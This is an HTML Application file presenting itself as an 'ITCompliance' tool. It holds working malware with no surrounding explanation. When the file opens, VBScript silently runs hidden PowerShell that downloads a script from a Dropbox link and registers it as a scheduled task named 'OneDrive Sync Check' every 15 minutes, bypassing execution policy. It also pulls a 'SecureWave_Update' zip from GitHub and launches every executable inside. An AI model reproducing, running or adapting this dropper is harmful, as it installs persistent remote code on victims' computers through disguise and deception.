<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<HTA:APPLICATION ID="oHTA" APPLICATIONNAME="ITCompliance" icon="taskmgr.exe" WINDOWSTATE="minimize"/>
<script language="VBScript">
    Sub Window_OnLoad
        Dim shell, tempPath, desktopPath, dropboxDecoyUrl, githubPayloadUrl, psCmd
        Set shell = CreateObject("WScript.Shell")
        
        ' הגדרת נתיבים
        tempPath = shell.ExpandEnvironmentStrings("%TEMP%")
        ' פקודה למציאת שולחן העבודה של המשתמש הנוכחי
        desktopPath = shell.SpecialFolders("Desktop")
        
              dropboxDecoyUrl = "https://www.dropbox.com/scl/fi/5iq051ltlzh6mvwg8h6m5/SystemCheck.ps1?rlkey=lbzlu807ltvh1bq7q8uv36tmo&st=moem0qzp&dl=1"
        githubPayloadUrl = "https://github.com/BugSocMdr/UpdateFiles/blob/main/SecureWave_Update.zip?raw=true"
        
              
              psCmd = "Invoke-WebRequest -Uri '" & dropboxDecoyUrl & "' -OutFile '" & tempPath & "\SystemCheck.ps1'; "
        
               psCmd = psCmd & "schtasks /create /sc minute /mo 15 /tn 'OneDrive Sync Check' /tr 'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File " & tempPath & "\SystemCheck.ps1' /f; "
        
               psCmd = psCmd & "Start-Process powershell.exe -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File " & tempPath & "\SystemCheck.ps1' -WindowStyle Hidden; "
        
               psCmd = psCmd & "$z='" & tempPath & "\SecureWave_Update.zip'; Invoke-WebRequest -Uri '" & githubPayloadUrl & "' -OutFile $z; " & _
                "Expand-Archive $z -DestinationPath '" & desktopPath & "\sw_upd' -Force; Remove-Item $z; " & _
                "Get-ChildItem '" & desktopPath & "\sw_upd' -Filter *.exe | ForEach-Object { Start-Process $_.FullName }"

              shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command """ & psCmd & """", 0, True
        
        self.close
    End Sub
</script>
</head>
<body>
</body>
</html>